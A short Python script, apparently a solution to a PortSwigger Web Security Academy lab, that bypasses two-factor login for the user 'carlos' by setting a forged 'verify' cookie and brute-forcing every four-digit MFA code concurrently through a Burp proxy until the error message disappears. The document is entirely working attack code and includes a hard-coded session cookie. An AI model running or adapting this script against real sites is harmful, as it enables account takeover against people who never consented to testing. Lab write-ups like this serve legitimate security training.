'''
before running this script , send GET request to /login2 with cookie: verify = carlos
'''
from concurrent.futures import ThreadPoolExecutor

import requests,urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# to see requests using burp suite
proxies = {
    "http" : "127.0.0.1:8080",
    "https" : "127.0.0.1:8080",
}
USE_PROXY = True

url = "https://0a6800a60306b58d82a31a6000e10097.web-security-academy.net/login2"

cookies = {
    "session" : "aqiUX7ipPLCKCyb8wKxRWKA6aaZ8oAil",
    "verify" : "carlos"
}

def try_code(i: int) -> str | None:
    code = str(i)
    data = {"mfa-code": code}

    try:
        response = requests.post(
            url=url,
            data=data,
            cookies=cookies,
            proxies=proxies if USE_PROXY else None,
            verify=False,
            timeout=15,
        )
    except requests.RequestException:
        return None

    soup = BeautifulSoup(response.text, "html.parser")

    warning = soup.find("p", class_="is-warning")
    target_msg = warning.get_text(strip=True) if warning else ""
    if target_msg != "Incorrect security code":
        return code
    return None


with ThreadPoolExecutor(max_workers=10) as executor:
    for code in executor.map(try_code, range(1000, 10000)):
        if code:
            print("mfa-code =", code)
            exit()